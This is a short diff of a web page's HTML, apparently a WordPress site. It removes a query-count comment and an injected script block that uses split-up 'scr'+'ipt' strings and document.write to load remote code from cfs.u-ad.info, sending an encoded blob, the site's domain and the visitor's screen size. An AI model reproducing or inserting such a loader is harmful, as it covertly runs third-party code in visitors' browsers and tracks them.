@@ -360,9 +360,6 @@
 <script type="text/javascript">
 jQuery(document).on('ready post-load', easy_fancybox_handler );
 </script>
-	<!-- 93 queries. 0.201 seconds. -->
-</div>
 
-<script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlRnNK%2fMXpoBKn9VtAxSkTDUWKvQjNHyGvP0pxhx23VMkFoWTF%2bDtIPZBlUBD5xfKGhiL3tcEQoxJ%2bMSusM4ye11husyfL%2fdVuIQbMRnp1t%2bO5KY78RE07NPzbamRL0UEgOacgIaHdh1mkkCVhyiVC7gvl3xpfAB2b%2bTmOdmyxFil4Vemcf6UVKC1R%2bokJqxxqP7mUPigwrhYThnHDLkPILpaiO6DJf%2b2tlzQbNzVuaEb%2b8KiUJ4BH2tkANm926rtMP2vlmqgsHQsGaT%2bAbtb244iH73JJGbjKx1uPfEFmpWmSbw42iWZgIR2rweXomDCSVX5FuHzqzhirpyiTsivBCasyugGdn86IOSztGjgpFThNUOoi3s90shXWoVz2PQvJINUWG3FJYMnwFvKTHPgxHE%2bOjtS4RLftNB%2fw70zHxIDlgchSevqoeu2ux7qtXxsHKHA5VRu9Qjiv9vbU2Ul1DOLxHKCx0FNiKHC6XzSQTBTIVd6uhT14UIEduKHrQZmrcg9cFPpG%2bz3S%2fbE6JOgx13rgDisCiT0IZwQkX%2fTu8Lbjp4QelM73xKQ%3d%3d");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body>
 </html>
 
